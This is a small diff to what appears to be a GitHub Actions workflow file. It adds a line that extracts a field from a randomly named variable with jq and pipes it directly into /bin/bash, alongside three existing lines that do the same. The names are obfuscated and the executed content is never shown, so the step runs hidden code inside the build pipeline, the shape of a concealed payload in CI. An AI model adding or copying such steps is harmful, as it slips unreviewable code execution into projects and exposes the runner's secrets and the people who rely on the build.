@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$bek352" | jq -r .e15 | /bin/bash
           echo $bgyei59 | jq -r .uiakp3 | /bin/bash
           printf '%s' "$qx870" | jq -r .adr40 | /bin/bash
+          printf '%s' "$n8" | jq -r .d84505 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
